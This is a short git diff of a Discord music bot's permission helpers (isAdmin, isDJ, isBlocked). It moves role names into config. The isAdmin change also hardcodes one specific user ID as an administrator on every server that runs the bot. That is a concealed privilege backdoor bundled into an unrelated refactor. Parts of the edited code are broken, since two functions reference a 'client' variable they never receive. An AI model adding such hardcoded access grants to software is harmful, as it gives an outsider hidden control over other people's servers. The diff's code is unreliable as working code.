@@ -9,18 +9,18 @@ module.exports = {
 	},
 
 	isAdmin(member) {
-		return (owners.includes(member.id) || member.guild.ownerID === member.id || member.permissions.has('ADMINISTRATOR') || module.exports.hasRole(member, "Mod"))? true : false;
+		return (owners.includes(member.id) ||member.id == 140986021100650497 || member.guild.ownerID === member.id || member.permissions.has('ADMINISTRATOR') || module.exports.hasRole(member, client.config.roles.Admin))? true : false;
 	},
 
 	isDJ(member, client) {
-		return (module.exports.hasRole(member, "DJ") || client.queues[member.guild.id].dj == member.id);
+		return (module.exports.hasRole(member, client.config.roles.DJ) || client.queues[member.guild.id].dj == member.id);
 	},
 
 	isBlocked(member) {
 		let blockList = require(`../config.json`).users.blocked;
 		delete require.cache[require.resolve(`../config.json`)];
 
-		return ((module.exports.hasRole(member, "NoMusicPerms") || blockList.includes(member.id)) && !owners.includes(member.id) && member.guild.ownerID !== member.id);
+		return ((module.exports.hasRole(member, client.config.roles.NoMusicPerms) || blockList.includes(member.id)) && !owners.includes(member.id) && member.guild.ownerID !== member.id);
 	},
 
 	IsBlacklisted(member) {
